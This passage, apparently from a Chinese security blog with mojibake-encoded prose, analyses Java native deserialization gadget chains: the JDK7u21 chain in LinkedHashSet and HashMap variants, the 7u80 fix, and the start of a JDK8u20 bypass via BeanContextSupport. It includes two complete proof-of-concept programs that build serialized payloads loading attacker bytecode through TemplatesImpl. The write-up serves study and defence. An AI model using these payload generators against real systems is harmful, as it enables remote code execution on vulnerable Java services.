class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿™ç§æ¢äº†ä¸ªé¡ºåºä¹Ÿå°±ä¸ä¼šæå‰ä»addè§¦å‘äº†ï¼Œå¯ä»¥æŠŠtypeField.setç§»ä¸Šå»</p><ul><li>ä¸ºä»€ä¹ˆysoserialä¸Šé¢æ˜¯LinkedHashSetå‘¢ï¼Ÿ</li></ul><p>æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œå¯èƒ½æ˜¯å¥½çœ‹ç‚¹ï¼Ÿä½ ä¹Ÿå¯ä»¥é€‰æ‹©ç”¨LinkedHashSetè£…é…</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914204859351.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914204859351.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ååºåˆ—åŒ–é“¾ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject -&gt;</span><br><span class="line">HashMap.put -&gt;</span><br><span class="line">AnnotationInvocationHandler.invoke-&gt; hashCodeImpl -&gt;</span><br><span class="line">AnnotationInvocationHandler.invoke-&gt; equalsImpl -&gt;</span><br><span class="line">TemplatesImpl.newTransformer</span><br></pre></td></tr></table></figure><h3 id="LinkedHashSetç‰ˆæœ¬"><a href="#LinkedHashSetç‰ˆæœ¬" class="headerlink" title="LinkedHashSetç‰ˆæœ¬"></a>LinkedHashSetç‰ˆæœ¬</h3><p>LinkedHashSetç‰ˆï¼š</p><p>HashSet.readObjectåˆ¤æ–­å¦‚æœæ˜¯ç”¨LinkedHashSetå¯¹è±¡ï¼Œå°±ç”¨LinkedHashMapå­˜å‚¨ã€‚LinkedHashMapå¢åŠ äº†ä¸€ä¸ªåŒå‘é“¾è¡¨æ¥é“¾æ¥æ‰€æœ‰Entryï¼Œéå†æ—¶æŒ‰ç…§å…ƒç´ è¢«æ’å…¥çš„é¡ºåºè¿›è¡Œéå†ã€‚addæ—¶æŒ‰ç…§æ­£å¸¸é¡ºåºadd</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917162236398.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917162236398.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\codecollect\\RMIServer\\RMIServer\\target\\classes\\org\\example\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">Annovar2map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Annovar2map.put(<span class="string">&quot;f5a5a608&quot;</span>,templatesClass);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">typeField</span> <span class="operator">=</span> annotationInvocationHandler.getClass().getDeclaredField(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        typeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">annoProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationInvocationHandler);</span><br><span class="line">        <span class="type">LinkedHashSet</span> <span class="variable">annoset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        annoset.add(templatesClass);</span><br><span class="line">        annoset.add(annoProxy);</span><br><span class="line">        typeField.set(annotationInvocationHandler, Templates.class);</span><br><span class="line">        serialize(annoset);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LinedHashSetååºåˆ—åŒ–é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.add()</span><br><span class="line">HashSet.readObject -&gt;</span><br><span class="line">HashMap.put -&gt;</span><br><span class="line">AnnotationInvocationHandler.invoke-&gt; hashCodeImpl -&gt;</span><br><span class="line">AnnotationInvocationHandler.invoke-&gt; equalsImpl -&gt;</span><br><span class="line">TemplatesImpl.newTransformer</span><br></pre></td></tr></table></figure><h3 id="HashMapç‰ˆ"><a href="#HashMapç‰ˆ" class="headerlink" title="HashMapç‰ˆ"></a>HashMapç‰ˆ</h3><p>ä»Šå¤©åœ¨æROME HotSwappableTargetSourceé“¾çš„æ—¶å€™çªç„¶å‘ç°ï¼ŒJDK7U21ååºåˆ—åŒ–é“¾ä¸ä»…HashMap.putè§¦å‘äº†key.equals</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910204239313.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910204239313.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>putForCreateä¹Ÿè°ƒç”¨äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923223431476.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923223431476.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è€Œä¸”HashMap.readObjectç›´æ¥è°ƒç”¨äº†putForCreateæ¥è¿˜åŸ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923223524583.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923223524583.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>what?ç›´æ¥å‘HashMapä¸¤ä¸ªputä¸å°±å®Œäº†ï¼Œè¿˜æä»€ä¹ˆHashSet</p><p>å¼€å¼„ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.misc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.hash.Hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21_HashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">Annovar2map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Annovar2map.put(<span class="string">&quot;f5a5a608&quot;</span>,templatesClass);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">typeField</span> <span class="operator">=</span> annotationInvocationHandler.getClass().getDeclaredField(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        typeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">annoProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationInvocationHandler);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">annoset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        annoset.put(annoProxy,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        annoset.put(templatesClass,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        typeField.set(annotationInvocationHandler, Templates.class);</span><br><span class="line">        serialize(annoset);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥JDK7u21æœ€å¤–å±‚ï¼Œç”¨HashMapï¼ŒHashSetï¼ŒLinkedHashSetéƒ½æ˜¯å¯ä»¥çš„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923225801055.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923225801055.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><h3 id="7u80"><a href="#7u80" class="headerlink" title="7u80"></a>7u80</h3><p>7u80çš„AnnotationInvocationHandleræ„é€ æ–¹æ³•å¯¹this.typeåŠ å¼ºäº†æ ¡éªŒ(æ²¡ä»€ä¹ˆåµç”¨ï¼Œåå°„ä¾æ—§èƒ½æ”¹)ï¼Œé‡ç‚¹æ˜¯åœ¨readObjectä¸­ï¼Œthis.typeä¸æ˜¯AnnotationTypeå­ç±»ç›´æ¥æŠ¥é”™ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914212135555.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914212135555.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h1 id="JDK8u20åŸç”Ÿååºåˆ—åŒ–"><a href="#JDK8u20åŸç”Ÿååºåˆ—åŒ–" class="headerlink" title="JDK8u20åŸç”Ÿååºåˆ—åŒ–"></a>JDK8u20åŸç”Ÿååºåˆ—åŒ–</h1><p>ç¯å¢ƒåˆ‡åˆ°8u20</p><p>åŸç†æ–¹é¢ä¸‹æ–‡è®²çš„å¾ˆé€å½»</p><p><a href="https://cloud.tencent.com/developer/article/2204437">https://cloud.tencent.com/developer/article/2204437</a></p><p>è¯¥æ¼æ´åˆ©ç”¨çš„æ˜¯<code>try&#123;...&#125; catch&#123;...&#125;</code>å—æœ‰æ— å‘å¤–throwå¼‚å¸¸çš„åŒºåˆ«</p><p>åŒºåˆ†ä¸‹é¢è¿™ä¸¤ä¸ªä¼ªä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">inerror</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        codeA  </span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å†…å±‚try catché”™è¯¯&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">outerror</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        inerror();</span><br><span class="line">        codeB</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å¤–å±‚try catché”™è¯¯&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨outerror()æ—¶ï¼Œå¦‚æœinerror()æ•æ‰åˆ°äº†å¼‚å¸¸ï¼Œæ‰“å°äº†<code>å†…å±‚try catché”™è¯¯</code>ï¼Œä¹Ÿä¼šç»§ç»­æ‰§è¡ŒcodeBï¼Œè€Œä¸ä¼šè¿›å…¥å¤–å±‚catchã€‚ä½†æ˜¯å¦‚æœcodeBæŠ¥é”™ï¼Œå°±ä¼šç»ˆæ­¢ä»£ç æµç¨‹è½¬è€ŒæŠ¥è¿™ç§çº¢é”™ï¼Œè€Œä¸ä¼šè¿›å…¥å¤–å±‚catch</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917101733057.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917101733057.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">inerror</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        codeA  </span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å†…å±‚try catché”™è¯¯&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">outerror</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        inerror();</span><br><span class="line">        codeB</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å¤–å±‚try catché”™è¯¯&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨outerror()æ—¶ï¼Œå¦‚æœinerror()æ•æ‰åˆ°äº†å¼‚å¸¸ï¼Œæ‰“å°äº†<code>å†…å±‚try catché”™è¯¯</code>ï¼Œ<strong>ä¸ä¼š</strong>ç»§ç»­æ‰§è¡ŒcodeBï¼Œç›´æ¥è¿›å…¥å¤–å±‚catchæ‰“å°<code>å¤–å±‚try catché”™è¯¯</code>ã€‚å¦‚æœinerroræ²¡æœ‰æ•æ‰åˆ°å¼‚å¸¸ï¼ŒcodeBæœ‰é”™ï¼Œä¹Ÿä¼šè¿›å…¥å¤–å±‚catchæ‰“å°<code>å¤–å±‚try catché”™è¯¯</code></p><p>ç›®å‰çœ‹æ¥è§„å¾‹å°±æ˜¯åµŒå¥—çš„<code>try&#123;...&#125; catch&#123;...&#125;</code>åªä¼šæŠ›å‡ºä¸€ä¸ªcatchï¼Œåªæœ‰å†…å±‚å‘å¤–å±‚throwå¼‚å¸¸çš„æ—¶å€™ï¼Œæ‰ä¼šé€å±‚å‘å¤–è§¦å‘catchã€‚å†…å±‚å‡½æ•°æ²¡æœ‰throwå¼‚å¸¸ï¼Œåˆ™ä¼šç»§ç»­è¿è¡Œå†…å±‚å‡½æ•°åé¢çš„ä»£ç ã€‚ä¸”æ²¡æœ‰throwçš„æƒ…å†µä¸‹è§¦å‘ç¬¬äºŒä¸ªå¼‚å¸¸ä¼šç»ˆæ­¢ç¨‹åºæŠ¥çº¢é”™</p><p>ç”±äºjdk7u21å¹¶æ²¡æœ‰ä½¿ç”¨åˆ°AnnotationInvocationHandler.readObjectï¼Œæ‰€ä»¥åªè¦èƒ½æ­£å¸¸ååºåˆ—åŒ–AnnotationInvocationHandlerï¼ˆä¸ç»ˆæ­¢è¿›ç¨‹æŠ¥çº¢é”™ï¼‰ï¼Œå°±èƒ½è§¦å‘jdk7u21ååºåˆ—åŒ–</p><p>è®©ä¸‹é¢çš„catchä¸æŠ¥çº¢é”™ï¼Œçº¢æ¡†åé¢çš„ä»£ç ä¸æ‰§è¡Œä¹Ÿæ— æ‰€è°“ï¼Œå·²ç»ç”¨defaultReadObjectååºåˆ—åŒ–å­—æ®µäº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917103708775.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917103708775.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>defaultReadObjectå¹¶ä¸ä¼šé“¾å¼è°ƒç”¨readOjectï¼Œåªä¼šååºåˆ—åŒ–è¯¥å¯¹è±¡çš„å­—æ®µ</p><p>ä½†æ˜¯å¯¹è±¡Aæœ‰ä¸€ä¸ªå­—æ®µBï¼ŒBæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£åœ¨Açš„readObjectè°ƒç”¨defaultReadObjectï¼Œä¼šè°ƒç”¨Bçš„readObject</p></blockquote><p>æŒ‰ä¸Šé¢çš„caseæ¥çœ‹ï¼Œéœ€è¦æœ‰ä»¥ä¸‹ç‰¹ç‚¹çš„ç±»æ¥åŒ…è£¹ï¼š</p><ul><li>readObjecté‡Œä¸€ä¸ª<code>try&#123;...&#125; catch&#123;...&#125;</code>è§¦å‘AnnotationInvocationHandler.readObject</li><li>ä¸Šä¸€ç‚¹çš„<code>catch&#123;...&#125;</code>å—ä¸èƒ½throwå¼‚å¸¸</li></ul><p>java.beans.beancontext.BeanContextSupportæ»¡è¶³ä»¥ä¸Šè¦æ±‚</p><p>BeanContextSupport.readObjectè°ƒç”¨readChildren()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917105019835.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917105019835.png" 